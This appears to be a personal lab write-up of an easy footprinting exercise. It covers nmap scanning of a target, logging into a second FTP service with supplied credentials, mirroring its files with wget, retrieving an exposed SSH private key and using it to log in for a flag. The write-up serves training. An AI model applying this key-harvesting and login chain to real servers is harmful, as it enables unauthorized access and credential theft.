### EASY

Enumerate the server carefully and find the flag.txt file. Submit the contents of this file as the answer

Credentials
```
ceil
```
```
qwer1234
```

**NMAP**
Scan used
```
nmap -sV -A -sC 10.129.91.129
```
```
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-14 20:25 EST
Nmap scan report for 10.129.91.129
Host is up (0.017s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     ProFTPD
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
|   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
|_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
53/tcp   open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
2121/tcp open  ftp     ProFTPD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 117.79 seconds
```

**FTP**

- There are two types of FTP servers: one running port 21, the other port 2121. 
- Use ceil's credentials to log into FTP port 2121
- Use 'ls -la' to reveal hidden files/directories

![[ftp_server_2121.png]]

- Download all files
```
wget -m --no-passive ftp://ceil:qwer1234@10.129.202.34:2121
```

- Change the permissions on the private key, giving it 700 access
```
sudo chmod 700 id_rsa
```

- I stored the path and key name as a variable for convenience, then ssh'd into the target
```
ceil_key="/home/dan/10.129.202.34:2121/.ssh/id_rsa"
```
```
ssh -i $ceil_key ceil@10.129.57.86
```

**Flag**
![[flag.png]]


### MEDIUM
